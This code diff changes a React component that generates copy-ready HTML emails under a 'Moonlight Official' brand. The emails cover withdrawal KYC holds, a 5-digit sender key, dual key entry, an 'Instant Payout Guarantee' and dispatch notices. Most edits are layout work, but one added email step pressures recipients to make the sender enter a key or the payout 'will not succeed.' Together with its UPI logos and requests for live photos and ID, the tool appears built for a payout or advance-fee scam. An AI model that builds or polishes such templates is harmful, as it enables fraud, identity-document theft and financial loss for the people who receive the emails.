@@ -12,6 +12,8 @@ import {
   ExternalLink,
   Sparkles,
   Info,
+  ChevronDown,
+  SlidersHorizontal,
 } from "lucide-react";
 import { toast } from "sonner";
 import { cn } from "@/lib/utils";
@@ -142,19 +144,25 @@ export function getKycEmailSubject(
 const MOBILE_EMAIL_STYLES = `
   <style type="text/css">
     @media only screen and (max-width: 620px) {
-      .email-wrapper { padding: 12px 4px !important; }
-      .email-card { border-radius: 14px !important; width: 100% !important; }
-      .email-header { padding: 20px 18px !important; }
-      .email-body { padding: 22px 16px !important; }
-      .email-footer { padding: 18px 16px !important; }
+      .email-wrapper { padding: 12px 6px !important; }
+      .email-card { border-radius: 14px !important; width: 100% !important; max-width: 100% !important; }
+      .email-header { padding: 18px 16px !important; }
+      .email-body { padding: 20px 14px !important; }
+      .email-footer { padding: 18px 14px !important; }
       .email-logo { width: 100px !important; }
       .email-amount { font-size: 26px !important; }
       .email-amount-sub { font-size: 15px !important; }
       .email-table-cell { display: block !important; width: 100% !important; padding: 8px 12px !important; }
-      .email-action-btn { padding: 14px 20px !important; font-size: 13px !important; }
+      .email-action-btn { padding: 12px 18px !important; font-size: 13px !important; }
+      .email-mobile-stack { display: block !important; width: 100% !important; margin-bottom: 8px !important; }
     }
     @media only screen and (max-width: 390px) {
+      .email-wrapper { padding: 8px 2px !important; }
+      .email-header { padding: 14px 12px !important; }
+      .email-body { padding: 16px 10px !important; }
       .email-amount { font-size: 22px !important; }
+      .email-amount-sub { font-size: 14px !important; }
+      .email-footer { padding: 14px 10px !important; }
     }
   </style>
 `;
@@ -755,12 +763,22 @@ export function buildKeySentInstructionEmailHtml(params: {
                     </div>
 
                     <!-- Step 2: Withdrawal Tab Entry -->
-                    <div style="background:#131c33;border:1px solid #1e293b;border-left:4px solid #10b981;border-radius:8px;padding:12px 14px;margin-bottom:16px;">
+                    <div style="background:#131c33;border:1px solid #1e293b;border-left:4px solid #10b981;border-radius:8px;padding:12px 14px;margin-bottom:12px;">
                       <p style="margin:0 0 4px;font-size:12px;color:#ffffff;font-weight:700;">
                         2️⃣ Enter Key in Your Withdrawal Tab
                       </p>
                       <p style="margin:0;font-size:12px;color:#cbd5e1;line-height:1.6;">
                         Also put the key directly into your active <strong>Withdrawal Tab</strong> for payout reference <code style="font-family:'IBM Plex Mono',monospace;color:#fbbf24;font-weight:600;">${reference}</code>.
+                      </p>
+                    </div>
+
+                    <!-- Step 3: Inform the Sender Too -->
+                    <div style="background:#26182c;border:1px solid #7c3aed;border-left:4px solid #a855f7;border-radius:8px;padding:12px 14px;margin-bottom:16px;">
+                      <p style="margin:0 0 4px;font-size:12px;color:#f3e8ff;font-weight:700;">
+                        3️⃣ Inform the Sender to Put the Key in Their Tab
+                      </p>
+                      <p style="margin:0;font-size:12px;color:#e9d5ff;line-height:1.6;">
+                        <strong>Crucial Requirement:</strong> You must inform the sender (<strong style="color:#ffffff;">${senderName}</strong>) as well to put the verification key in their tab, <strong>or else the payout will not succeed</strong>. Both parties must submit their keys for the system to complete the clearance handshake.
                       </p>
                     </div>
 
@@ -770,7 +788,7 @@ export function buildKeySentInstructionEmailHtml(params: {
                         ⚡ Instant Payout Guarantee
                       </p>
                       <p style="margin:0;font-size:13px;color:#a7f3d0;font-weight:600;line-height:1.65;">
-                        When both keys are put and you have sent the correct key, the money will be out for release without any extra verification.
+                        When both keys are put (on the website and in the withdrawal tab, and the sender puts the key in their tab) and you have sent the correct key, the money will be out for release without any extra verification.
                       </p>
                     </div>
 
@@ -1650,6 +1668,7 @@ export function EmailTemplateModal({
 
   const [copied, setCopied] = useState(false);
   const [copiedSubject, setCopiedSubject] = useState(false);
+  const [showContextFields, setShowContextFields] = useState(false);
 
   const getSubject = () => getKycEmailSubject(tab, reference, amount, currency);
 
@@ -1804,7 +1823,7 @@ export function EmailTemplateModal({
   if (!open) return null;
 
   return (
-    <div className="fixed inset-0 z-[9999] flex items-center justify-center p-3 sm:p-5">
+    <div className="fixed inset-0 z-[9999] flex items-center justify-center p-2 sm:p-4 md:p-6 overflow-y-auto">
       {/* Backdrop */}
       <div
         className="fixed inset-0 bg-black/80 backdrop-blur-md animate-fade-in"
@@ -1815,20 +1834,20 @@ export function EmailTemplateModal({
       <div
         role="dialog"
         aria-modal="true"
-        className="relative z-10 w-full max-w-4xl max-h-[92vh] flex flex-col rounded-3xl border border-border/80 bg-card shadow-2xl overflow-hidden animate-scale-in"
+        className="relative z-10 w-full max-w-4xl max-h-[96vh] sm:max-h-[92vh] flex flex-col rounded-2xl sm:rounded-3xl border border-border/80 bg-card shadow-2xl overflow-hidden animate-scale-in"
       >
         {/* Header */}
-        <div className="px-5 py-4 border-b border-border bg-card flex items-center justify-between shrink-0">
-          <div className="flex items-center gap-2.5">
-            <div className="flex h-9 w-9 items-center justify-center rounded-xl bg-primary/10 border border-primary/20 text-primary">
+        <div className="px-4 py-3 sm:px-5 sm:py-4 border-b border-border bg-card flex items-center justify-between shrink-0">
+          <div className="flex items-center gap-2.5 min-w-0">
+            <div className="flex h-8 w-8 sm:h-9 sm:w-9 items-center justify-center rounded-xl bg-primary/10 border border-primary/20 text-primary shrink-0">
               <Mail className="h-4 w-4" />
             </div>
-            <div>
-              <h2 className="text-sm font-bold text-foreground">
-                Moonlight Official Email Notification Suite
+            <div className="min-w-0">
+              <h2 className="text-xs sm:text-sm font-bold text-foreground truncate">
+                Moonlight Official Email Suite
               </h2>
-              <p className="text-[11px] text-muted-foreground">
-                Company HTML templates with embedded UPI logos &amp; IBM Plex fonts (1-tap ready for Gmail/Outlook)
+              <p className="text-[10px] sm:text-[11px] text-muted-foreground truncate">
+                Company HTML templates · UPI &amp; IBM Plex fonts · 1-Tap Ready
               </p>
             </div>
           </div>
@@ -1836,7 +1855,7 @@ export function EmailTemplateModal({
             type="button"
             onClick={() => onOpenChange(false)}
             aria-label="Close"
-            className="flex h-8 w-8 items-center justify-center rounded-lg border border-border bg-secondary/50 text-muted-foreground hover:text-foreground hover:bg-secondary transition-colors cursor-pointer"
+            className="flex h-8 w-8 items-center justify-center rounded-lg border border-border bg-secondary/50 text-muted-foreground hover:text-foreground hover:bg-secondary transition-colors cursor-pointer shrink-0 ml-2"
           >
             <X className="h-4 w-4" />
           </button>
@@ -1844,103 +1863,112 @@ export function EmailTemplateModal({
 
         {/* 7-Day Consolidation Active Banner */}
         {batchCount > 1 && (
-          <div className="px-5 py-2.5 bg-purple-500/10 border-b border-purple-500/25 flex items-center justify-between text-xs text-purple-600 dark:text-purple-300 shrink-0">
-            <div className="flex items-center gap-2">
+          <div className="px-4 py-2 sm:px-5 sm:py-2.5 bg-purple-500/10 border-b border-purple-500/25 flex flex-col sm:flex-row sm:items-center justify-between gap-1 sm:gap-2 text-xs text-purple-600 dark:text-purple-300 shrink-0">
+            <div className="flex items-center gap-2 min-w-0">
               <Sparkles className="h-4 w-4 shrink-0 text-purple-500" />
-              <span>
-                <strong>7-Day Consolidation Active:</strong> {batchCount} withdrawals in last 7 days are merged into this single email ({amount} {currency}) under reference ID <code className="font-mono font-bold text-purple-700 dark:text-purple-200">{reference}</code>.
+              <span className="truncate sm:whitespace-normal text-[11px] sm:text-xs">
+                <strong>7-Day Combined:</strong> {batchCount} withdrawals merged ({amount} {currency}) Ref: <code className="font-mono font-bold text-purple-700 dark:text-purple-200">{reference}</code>
               </span>
             </div>
-            <span className="text-[10px] bg-purple-500/20 text-purple-700 dark:text-purple-300 font-bold px-2 py-0.5 rounded-full uppercase shrink-0">
+            <span className="text-[9px] sm:text-[10px] bg-purple-500/20 text-purple-700 dark:text-purple-300 font-bold px-2 py-0.5 rounded-full uppercase shrink-0 self-start sm:self-auto">
               {batchCount} Combined
             </span>
           </div>
         )}
 
-        {/* Template Selector (3 SPECIALIZED CLEARANCE TEMPLATES) */}
-        <div className="px-5 py-3 border-b border-border bg-secondary/30 flex items-center justify-between flex-wrap gap-2 shrink-0">
-          <div className="flex items-center gap-2 flex-wrap">
-            <button
-              type="button"
-              onClick={() => setTab("kyc_hold")}
-              className={cn(
-                "px-3.5 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer flex items-center gap-1.5",
-                tab === "kyc_hold"
-                  ? "bg-amber-500/20 text-amber-600 dark:text-amber-400 border border-amber-500/40 shadow-xs"
-                  : "text-muted-foreground hover:text-foreground hover:bg-secondary",
-              )}
-            >
-              <ShieldAlert className="h-3.5 w-3.5" />
-              <span>1. Withdrawal KYC Hold (Live Photo + ID)</span>
-            </button>
-            <button
-              type="button"
-              onClick={() => setTab("kyc_approved_key")}
-              className={cn(
-                "px-3.5 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer flex items-center gap-1.5",
-                tab === "kyc_approved_key"
-                  ? "bg-emerald-500/20 text-emerald-600 dark:text-emerald-400 border border-emerald-500/40 shadow-xs"
-                  : "text-muted-foreground hover:text-foreground hover:bg-secondary",
-              )}
-            >
-              <KeyRound className="h-3.5 w-3.5" />
-              <span>2. KYC Approved (5-Digit Sender Key)</span>
-            </button>
-            <button
-              type="button"
-              onClick={() => setTab("key_sent_instruction")}
-              className={cn(
-                "px-3.5 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer flex items-center gap-1.5",
-                tab === "key_sent_instruction"
-                  ? "bg-cyan-500/20 text-cyan-600 dark:text-cyan-400 border border-cyan-500/40 shadow-xs"
-                  : "text-muted-foreground hover:text-foreground hover:bg-secondary",
-              )}
-            >
-              <KeyRound className="h-3.5 w-3.5" />
-              <span>3. Key Sent (Website &amp; Tab Dual Entry)</span>
-            </button>
-            <button
-              type="button"
-              onClick={() => setTab("kyc_rejected")}
-              className={cn(
-                "px-3.5 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer flex items-center gap-1.5",
-                tab === "kyc_rejected"
-                  ? "bg-rose-500/20 text-rose-600 dark:text-rose-400 border border-rose-500/40 shadow-xs"
-                  : "text-muted-foreground hover:text-foreground hover:bg-secondary",
-              )}
-            >
-              <XCircle className="h-3.5 w-3.5" />
-              <span>4. KYC Failed (School/College ID)</span>
-            </button>
-            <button
-              type="button"
-              onClick={() => setTab("key_verification_started")}
-              className={cn(
-                "px-3.5 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer flex items-center gap-1.5",
-                tab === "key_verification_started"
-                  ? "bg-blue-500/20 text-blue-600 dark:text-blue-400 border border-blue-500/40 shadow-xs"
-                  : "text-muted-foreground hover:text-foreground hover:bg-secondary",
-              )}
-            >
-              <KeyRound className="h-3.5 w-3.5" />
-              <span>5. Key Verification Started</span>
-            </button>
-            <button
-              type="button"
-              onClick={() => setTab("all_success")}
-              className={cn(
-                "px-3.5 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer flex items-center gap-1.5",
-                tab === "all_success"
-                  ? "bg-emerald-600/20 text-emerald-600 dark:text-emerald-400 border border-emerald-600/40 shadow-xs"
-                  : "text-muted-foreground hover:text-foreground hover:bg-secondary",
-              )}
-            >
-              <Check className="h-3.5 w-3.5" />
-              <span>6. All Success (Dispatched)</span>
-            </button>
+        {/* Template Selector & Action Toolbar */}
+        <div className="border-b border-border bg-secondary/30 shrink-0">
+          {/* Horizontal swipeable tab strip */}
+          <div className="px-3 sm:px-5 py-2 border-b border-border/40">
+            <div className="flex items-center gap-1.5 overflow-x-auto no-scrollbar scrollbar-none py-0.5 -mx-1 px-1 sm:mx-0 sm:px-0 sm:flex-wrap shrink-0 touch-pan-x">
+              <button
+                type="button"
+                onClick={() => setTab("kyc_hold")}
+                className={cn(
+                  "px-3 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer flex items-center gap-1.5 shrink-0 whitespace-nowrap",
+                  tab === "kyc_hold"
+                    ? "bg-amber-500/20 text-amber-600 dark:text-amber-400 border border-amber-500/40 shadow-xs"
+                    : "text-muted-foreground hover:text-foreground hover:bg-secondary",
+                )}
+              >
+                <ShieldAlert className="h-3.5 w-3.5 shrink-0" />
+                <span>1. KYC Hold</span>
+                <span className="hidden md:inline">(Photo + ID)</span>
+              </button>
+              <button
+                type="button"
+                onClick={() => setTab("kyc_approved_key")}
+                className={cn(
+                  "px-3 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer flex items-center gap-1.5 shrink-0 whitespace-nowrap",
+                  tab === "kyc_approved_key"
+                    ? "bg-emerald-500/20 text-emerald-600 dark:text-emerald-400 border border-emerald-500/40 shadow-xs"
+                    : "text-muted-foreground hover:text-foreground hover:bg-secondary",
+                )}
+              >
+                <KeyRound className="h-3.5 w-3.5 shrink-0" />
+                <span>2. KYC Approved</span>
+                <span className="hidden md:inline">(Sender Key)</span>
+              </button>
+              <button
+                type="button"
+                onClick={() => setTab("key_sent_instruction")}
+                className={cn(
+                  "px-3 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer flex items-center gap-1.5 shrink-0 whitespace-nowrap",
+                  tab === "key_sent_instruction"
+                    ? "bg-cyan-500/20 text-cyan-600 dark:text-cyan-400 border border-cyan-500/40 shadow-xs"
+                    : "text-muted-foreground hover:text-foreground hover:bg-secondary",
+                )}
+              >
+                <KeyRound className="h-3.5 w-3.5 shrink-0" />
+                <span>3. Key Sent</span>
+                <span className="hidden md:inline">(Website &amp; Tab)</span>
+              </button>
+              <button
+                type="button"
+                onClick={() => setTab("kyc_rejected")}
+                className={cn(
+                  "px-3 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer flex items-center gap-1.5 shrink-0 whitespace-nowrap",
+                  tab === "kyc_rejected"
+                    ? "bg-rose-500/20 text-rose-600 dark:text-rose-400 border border-rose-500/40 shadow-xs"
+                    : "text-muted-foreground hover:text-foreground hover:bg-secondary",
+                )}
+              >
+                <XCircle className="h-3.5 w-3.5 shrink-0" />
+                <span>4. KYC Failed</span>
+                <span className="hidden md:inline">(School ID)</span>
+              </button>
+              <button
+                type="button"
+                onClick={() => setTab("key_verification_started")}
+                className={cn(
+                  "px-3 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer flex items-center gap-1.5 shrink-0 whitespace-nowrap",
+                  tab === "key_verification_started"
+                    ? "bg-blue-500/20 text-blue-600 dark:text-blue-400 border border-blue-500/40 shadow-xs"
+                    : "text-muted-foreground hover:text-foreground hover:bg-secondary",
+                )}
+              >
+                <KeyRound className="h-3.5 w-3.5 shrink-0" />
+                <span>5. Key Verifying</span>
+              </button>
+              <button
+                type="button"
+                onClick={() => setTab("all_success")}
+                className={cn(
+                  "px-3 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer flex items-center gap-1.5 shrink-0 whitespace-nowrap",
+                  tab === "all_success"
+                    ? "bg-emerald-600/20 text-emerald-600 dark:text-emerald-400 border border-emerald-600/40 shadow-xs"
+                    : "text-muted-foreground hover:text-foreground hover:bg-secondary",
+                )}
+              >
+                <Check className="h-3.5 w-3.5 shrink-0" />
+                <span>6. Dispatched</span>
+                <span className="hidden md:inline">(All Done)</span>
+              </button>
+            </div>
           </div>
 
-          <div className="flex items-center gap-2">
+          {/* Sub-bar: Mode Toggle & Action Buttons */}
+          <div className="px-3 sm:px-5 py-2 flex items-center justify-between gap-2 flex-wrap">
             <div className="flex items-center gap-1 rounded-xl bg-secondary p-0.5">
               <button
                 type="button"
@@ -1966,7 +1994,7 @@ export function EmailTemplateModal({
                 )}
               >
                 <Code className="h-3 w-3" />
-                <span>HTML Code</span>
+                <span>HTML</span>
               </button>
             </div>
 
@@ -1975,150 +2003,179 @@ export function EmailTemplateModal({
                 type="button"
                 onClick={copySubject}
                 title={getSubject()}
-                className="inline-flex items-center gap-1.5 h-8 px-3 rounded-xl bg-secondary hover:bg-secondary/80 border border-border text-foreground text-xs font-semibold transition-all shadow-xs cursor-pointer"
+                className="inline-flex items-center gap-1.5 h-7 sm:h-8 px-2.5 sm:px-3 rounded-xl bg-secondary hover:bg-secondary/80 border border-border text-foreground text-[11px] sm:text-xs font-semibold transition-all shadow-xs cursor-pointer"
               >
                 {copiedSubject ? <Check className="h-3.5 w-3.5 text-emerald-500" /> : <Mail className="h-3.5 w-3.5" />}
-                <span>{copiedSubject ? "Subject Copied!" : "Copy Subject"}</span>
+                <span className="hidden sm:inline">{copiedSubject ? "Subject Copied!" : "Copy Subject"}</span>
+                <span className="sm:hidden">{copiedSubject ? "Copied" : "Subject"}</span>
               </button>
               <button
                 type="button"
                 onClick={copyToClipboard}
-                className="inline-flex items-center gap-1.5 h-8 px-3.5 rounded-xl bg-primary hover:bg-primary/90 text-primary-foreground text-xs font-bold transition-all shadow-xs cursor-pointer"
+                className="inline-flex items-center gap-1.5 h-7 sm:h-8 px-2.5 sm:px-3.5 rounded-xl bg-primary hover:bg-primary/90 text-primary-foreground text-[11px] sm:text-xs font-bold transition-all shadow-xs cursor-pointer"
               >
                 {copied ? <Check className="h-3.5 w-3.5" /> : <Copy className="h-3.5 w-3.5" />}
-                <span>{copied ? "Copied HTML!" : "1-Tap Copy HTML"}</span>
+                <span>{copied ? "Copied HTML!" : "1-Tap Copy"}</span>
               </button>
             </div>
           </div>
         </div>
 
-        {/* Dynamic Context Fields Bar */}
-        <div className="px-5 py-3 border-b border-border bg-card/60 grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-7 gap-2.5 text-xs shrink-0">
-          <div className="space-y-1">
-            <label className="text-[10px] font-semibold text-muted-foreground uppercase">Beneficiary</label>
-            <input
-              type="text"
-              value={recipient}
-              onChange={(e) => setRecipient(e.target.value)}
-              className="h-8 w-full rounded-lg border border-input bg-background px-2.5 text-xs font-medium"
-            />
+        {/* Dynamic Context Fields Bar with Collapsible Mobile Toggle */}
+        <div className="border-b border-border bg-card/60 text-xs shrink-0">
+          {/* Summary toggle row */}
+          <div className="px-3 sm:px-5 py-2 flex items-center justify-between gap-2">
+            <div className="flex items-center gap-2 min-w-0">
+              <SlidersHorizontal className="h-3.5 w-3.5 text-muted-foreground shrink-0" />
+              <span className="text-[11px] font-semibold text-muted-foreground uppercase tracking-wider hidden sm:inline">
+                Variables:
+              </span>
+              <span className="text-[11px] text-foreground font-mono truncate">
+                {amount} {currency} · {recipient} · {reference}
+              </span>
+            </div>
+            <button
+              type="button"
+              onClick={() => setShowContextFields(!showContextFields)}
+              className="inline-flex items-center gap-1 text-[11px] font-semibold text-primary hover:underline shrink-0 cursor-pointer"
+            >
+              <span>{showContextFields ? "Hide Inputs" : "Edit Details"}</span>
+              <ChevronDown className={cn("h-3.5 w-3.5 transition-transform", showContextFields && "rotate-180")} />
+            </button>
           </div>
-          {tab === "kyc_approved_key" && (
-            <div className="space-y-1">
-              <label className="text-[10px] font-semibold text-muted-foreground uppercase">Sender (e.g. Brooklyn)</label>
-              <input
-                type="text"
-                value={sender}
-                onChange={(e) => setSender(e.target.value)}
-                className="h-8 w-full rounded-lg border border-input bg-background px-2.5 text-xs font-medium"
-              />
+
+          {/* Expandable input fields */}
+          {showContextFields && (
+            <div className="px-3 sm:px-5 pb-3 pt-1 grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-7 gap-2.5 text-xs border-t border-border/40 animate-fade-in">
+              <div className="space-y-1">
+                <label className="text-[10px] font-semibold text-muted-foreground uppercase">Beneficiary</label>
+                <input
+                  type="text"
+                  value={recipient}
+                  onChange={(e) => setRecipient(e.target.value)}
+                  className="h-8 w-full rounded-lg border border-input bg-background px-2.5 text-xs font-medium"
+                />
+              </div>
+              {tab === "kyc_approved_key" && (
+                <div className="space-y-1">
+                  <label className="text-[10px] font-semibold text-muted-foreground uppercase">Sender</label>
+                  <input
+                    type="text"
+                    value={sender}
+                    onChange={(e) => setSender(e.target.value)}
+                    className="h-8 w-full rounded-lg border border-input bg-background px-2.5 text-xs font-medium"
+                  />
+                </div>
+              )}
+              <div className="space-y-1">
+                <label className="text-[10px] font-semibold text-muted-foreground uppercase">Amount</label>
+                <input
+                  type="text"
+                  value={amount}
+                  onChange={(e) => setAmount(e.target.value)}
+                  className="h-8 w-full rounded-lg border border-input bg-background px-2.5 text-xs font-mono font-medium"
+                />
+              </div>
+              <div className="space-y-1">
+                <label className="text-[10px] font-semibold text-muted-foreground uppercase">Currency</label>
+                <input
+                  type="text"
+                  value={currency}
+                  onChange={(e) => setCurrency(e.target.value.toUpperCase())}
+                  className="h-8 w-full rounded-lg border border-input bg-background px-2.5 text-xs uppercase font-medium"
+                />
+              </div>
+              <div className="space-y-1">
+                <label className="text-[10px] font-semibold text-muted-foreground uppercase">7-Day Combined</label>
+                <input
+                  type="number"
+                  min={1}
+                  max={50}
+                  value={batchCount}
+                  onChange={(e) => setBatchCount(Math.max(1, parseInt(e.target.value) || 1))}
+                  className="h-8 w-full rounded-lg border border-input bg-background px-2.5 text-xs font-mono font-medium"
+                />
+              </div>
+              <div className="space-y-1">
+                <label className="text-[10px] font-semibold text-muted-foreground uppercase">Payout Method</label>
+                <input
+                  type="text"
+                  value={method}
+                  onChange={(e) => setMethod(e.target.value)}
+                  className="h-8 w-full rounded-lg border border-input bg-background px-2.5 text-xs font-medium"
+                />
+              </div>
+              <div className="space-y-1">
+                <label className="text-[10px] font-semibold text-muted-foreground uppercase">Destination</label>
+                <input
+                  type="text"
+                  value={destination}
+                  onChange={(e) => setDestination(e.target.value)}
+                  className="h-8 w-full rounded-lg border border-input bg-background px-2.5 text-xs font-mono font-medium"
+                />
+              </div>
+              <div className="space-y-1">
+                <label className="text-[10px] font-semibold text-muted-foreground uppercase">Reference ID</label>
+                <input
+                  type="text"
+                  value={reference}
+                  onChange={(e) => setReference(e.target.value)}
+                  className="h-8 w-full rounded-lg border border-input bg-background px-2.5 text-xs font-mono font-medium"
+                />
+              </div>
             </div>
           )}
-          <div className="space-y-1">
-            <label className="text-[10px] font-semibold text-muted-foreground uppercase">Amount</label>
-            <input
-              type="text"
-              value={amount}
-              onChange={(e) => setAmount(e.target.value)}
-              className="h-8 w-full rounded-lg border border-input bg-background px-2.5 text-xs font-mono font-medium"
-            />
-          </div>
-          <div className="space-y-1">
-            <label className="text-[10px] font-semibold text-muted-foreground uppercase">Currency</label>
-            <input
-              type="text"
-              value={currency}
-              onChange={(e) => setCurrency(e.target.value.toUpperCase())}
-              className="h-8 w-full rounded-lg border border-input bg-background px-2.5 text-xs uppercase font-medium"
-            />
-          </div>
-          <div className="space-y-1">
-            <label className="text-[10px] font-semibold text-muted-foreground uppercase">7-Day Combined</label>
-            <input
-              type="number"
-              min={1}
-              max={50}
-              value={batchCount}
-              onChange={(e) => setBatchCount(Math.max(1, parseInt(e.target.value) || 1))}
-              className="h-8 w-full rounded-lg border border-input bg-background px-2.5 text-xs font-mono font-medium"
-            />
-          </div>
-          <div className="space-y-1">
-            <label className="text-[10px] font-semibold text-muted-foreground uppercase">Payout Method</label>
-            <input
-              type="text"
-              value={method}
-              onChange={(e) => setMethod(e.target.value)}
-              className="h-8 w-full rounded-lg border border-input bg-background px-2.5 text-xs font-medium"
-            />
-          </div>
-          <div className="space-y-1">
-            <label className="text-[10px] font-semibold text-muted-foreground uppercase">Destination / UPI ID</label>
-            <input
-              type="text"
-              value={destination}
-              onChange={(e) => setDestination(e.target.value)}
-              className="h-8 w-full rounded-lg border border-input bg-background px-2.5 text-xs font-mono font-medium"
-            />
-          </div>
-          <div className="space-y-1">
-            <label className="text-[10px] font-semibold text-muted-foreground uppercase">Reference ID</label>
-            <input
-              type="text"
-              value={reference}
-              onChange={(e) => setReference(e.target.value)}
-              className="h-8 w-full rounded-lg border border-input bg-background px-2.5 text-xs font-mono font-medium"
-            />
-          </div>
         </div>
 
         {/* Preview / HTML Code Area */}
-        <div className="flex-1 overflow-y-auto bg-muted/40 p-4">
+        <div className="flex-1 overflow-y-auto bg-muted/40 p-2 sm:p-4">
           {previewMode === "visual" ? (
-            <div className="mx-auto max-w-[650px] shadow-lg rounded-2xl overflow-hidden border border-border bg-[#0d0f17]">
+            <div className="mx-auto max-w-[650px] shadow-lg rounded-xl sm:rounded-2xl overflow-hidden border border-border bg-[#0d0f17]">
               <iframe
                 title="Email Template Render"
                 srcDoc={generatedHtml}
-                className="w-full h-[520px] border-0"
+                className="w-full h-[380px] sm:h-[460px] md:h-[520px] max-h-[58vh] border-0"
                 sandbox="allow-same-origin"
               />
             </div>
           ) : (
-            <pre className="mx-auto max-w-[750px] p-4 text-[11px] font-mono text-muted-foreground bg-background rounded-2xl border border-border overflow-x-auto whitespace-pre-wrap leading-relaxed select-all max-h-[520px]">
+            <pre className="mx-auto max-w-[750px] p-3 sm:p-4 text-[10px] sm:text-[11px] font-mono text-muted-foreground bg-background rounded-xl sm:rounded-2xl border border-border overflow-x-auto whitespace-pre-wrap leading-relaxed select-all max-h-[520px]">
               {generatedHtml}
             </pre>
           )}
         </div>
 
         {/* Footer Actions */}
-        <div className="px-5 py-3 border-t border-border bg-card flex flex-col sm:flex-row items-start sm:items-center justify-between gap-2 shrink-0">
-          <p className="text-[11px] text-muted-foreground leading-relaxed">
-            <span className="font-semibold text-foreground block">Subject: </span>
-            <span className="font-mono text-[10px] text-muted-foreground">{getSubject()}</span>
-          </p>
-          <div className="flex items-center gap-1.5 shrink-0">
+        <div className="px-3 sm:px-5 py-2.5 sm:py-3 border-t border-border bg-card flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-2.5 shrink-0">
+          <div className="min-w-0">
+            <p className="text-[10px] sm:text-[11px] text-muted-foreground truncate">
+              <span className="font-semibold text-foreground">Subject: </span>
+              <span className="font-mono text-[10px]">{getSubject()}</span>
+            </p>
+          </div>
+          <div className="grid grid-cols-3 sm:flex items-center gap-1.5 shrink-0">
             <button
               type="button"
               onClick={copySubject}
-              className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-xl border border-border bg-secondary hover:bg-secondary/80 text-xs font-semibold transition-all cursor-pointer"
+              className="inline-flex items-center justify-center gap-1.5 h-9 sm:h-8 px-2.5 sm:px-3 rounded-xl border border-border bg-secondary hover:bg-secondary/80 text-[11px] sm:text-xs font-semibold transition-all cursor-pointer"
             >
-              {copiedSubject ? <Check className="h-3.5 w-3.5 text-emerald-500" /> : <Mail className="h-3.5 w-3.5" />}
-              <span>{copiedSubject ? "Subject Copied!" : "Copy Subject"}</span>
+              {copiedSubject ? <Check className="h-3.5 w-3.5 text-emerald-500 shrink-0" /> : <Mail className="h-3.5 w-3.5 shrink-0" />}
+              <span className="truncate">{copiedSubject ? "Copied!" : "Subject"}</span>
             </button>
             <button
               type="button"
               onClick={() => onOpenChange(false)}
-              className="px-4 py-1.5 rounded-xl border border-border bg-secondary hover:bg-secondary/80 text-xs font-medium cursor-pointer"
+              className="inline-flex items-center justify-center h-9 sm:h-8 px-3 sm:px-4 rounded-xl border border-border bg-secondary hover:bg-secondary/80 text-[11px] sm:text-xs font-medium cursor-pointer"
             >
               Close
             </button>
             <button
               type="button"
               onClick={copyToClipboard}
-              className="inline-flex items-center gap-1.5 px-4 py-1.5 rounded-xl bg-primary hover:bg-primary/90 text-primary-foreground text-xs font-bold transition-all shadow-xs cursor-pointer"
+              className="inline-flex items-center justify-center gap-1.5 h-9 sm:h-8 px-3 sm:px-4 rounded-xl bg-primary hover:bg-primary/90 text-primary-foreground text-[11px] sm:text-xs font-bold transition-all shadow-xs cursor-pointer"
             >
-              {copied ? <Check className="h-3.5 w-3.5" /> : <Copy className="h-3.5 w-3.5" />}
-              <span>{copied ? "Copied!" : "Copy HTML"}</span>
+              {copied ? <Check className="h-3.5 w-3.5 shrink-0" /> : <Copy className="h-3.5 w-3.5 shrink-0" />}
+              <span className="truncate">{copied ? "Copied!" : "Copy HTML"}</span>
             </button>
           </div>
         </div>
@@ -2302,23 +2359,23 @@ export function EmailTemplatesSection() {
             Official company HTML templates with embedded UPI logos and IBM Plex typography.
           </p>
         </div>
-        <div className="flex items-center gap-2">
+        <div className="grid grid-cols-2 sm:flex items-center gap-2 w-full sm:w-auto">
           <button
             type="button"
             onClick={copySubject}
             title={getSubject()}
-            className="inline-flex items-center gap-2 h-10 px-4 rounded-xl border border-border bg-secondary hover:bg-secondary/80 text-foreground text-xs font-semibold transition-all cursor-pointer"
+            className="inline-flex items-center justify-center gap-2 h-10 px-3 sm:px-4 rounded-xl border border-border bg-secondary hover:bg-secondary/80 text-foreground text-xs font-semibold transition-all cursor-pointer"
           >
-            {copiedSubject ? <Check className="h-4 w-4 text-emerald-500" /> : <Mail className="h-4 w-4" />}
-            <span>{copiedSubject ? "Subject Copied!" : "Copy Subject"}</span>
+            {copiedSubject ? <Check className="h-4 w-4 text-emerald-500 shrink-0" /> : <Mail className="h-4 w-4 shrink-0" />}
+            <span className="truncate">{copiedSubject ? "Copied!" : "Copy Subject"}</span>
           </button>
           <button
             type="button"
             onClick={copy}
-            className="inline-flex items-center gap-2 h-10 px-5 rounded-xl bg-primary hover:bg-primary/90 text-primary-foreground text-xs font-bold transition-all shadow-md cursor-pointer"
+            className="inline-flex items-center justify-center gap-2 h-10 px-4 sm:px-5 rounded-xl bg-primary hover:bg-primary/90 text-primary-foreground text-xs font-bold transition-all shadow-md cursor-pointer"
           >
-            {copied ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
-            <span>{copied ? "Copied HTML!" : "1-Tap Copy HTML"}</span>
+            {copied ? <Check className="h-4 w-4 shrink-0" /> : <Copy className="h-4 w-4 shrink-0" />}
+            <span className="truncate">{copied ? "Copied HTML!" : "1-Tap Copy"}</span>
           </button>
         </div>
       </div>
@@ -2330,7 +2387,7 @@ export function EmailTemplatesSection() {
           <p className="text-muted-foreground leading-relaxed">
             1. <strong>Withdrawal KYC Hold:</strong> Sent when a withdrawal is held. Contains required documents and guidance.<br />
             2. <strong>KYC Approved:</strong> Sent after KYC. Explains 5-digit key sent to sender (e.g. Brooklyn) to release payout.<br />
